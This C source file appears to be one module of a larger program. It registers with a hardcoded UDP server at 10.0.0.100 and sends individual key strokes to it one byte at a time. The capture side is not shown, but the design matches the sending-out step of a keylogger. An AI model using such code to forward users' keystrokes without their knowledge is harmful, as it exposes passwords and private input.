#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "error_hndl.h"

#define SRV_IP "10.0.0.100"
#define PORT 8888
#define BUFLEN 1
#define BUFLEN_REG 10

struct sockaddr_in si_other;
static int s;



void udp_init()
{
	if ((s=socket(AF_INET, SOCK_DGRAM, 0))==-1)
	{
		die("socket failed\n");
	}
	
	memset((char *) &si_other, 0, sizeof(si_other));
	si_other.sin_family = AF_INET;
	si_other.sin_port = htons(PORT);
	si_other.sin_addr.s_addr = inet_addr(SRV_IP);
}

void register_in_server()
{
	char buf[10] = "register";
	socklen_t slen=sizeof(si_other);

	if (sendto(s, buf, BUFLEN_REG, 0, (struct sockaddr *)&si_other, slen)==-1)
	{
		die("sendto() failed");
	}
	
	printf("A %s message was sent to server\n", buf);
}

void send_message(void* key_stroke)
{
	socklen_t slen=sizeof(si_other);

	if (sendto(s, key_stroke, BUFLEN, 0, (struct sockaddr *)&si_other, slen)==-1)
	{
		die("sendto() failed");
	}
	printf("A message was sent for key stroke %s\n", (char*)key_stroke);
}
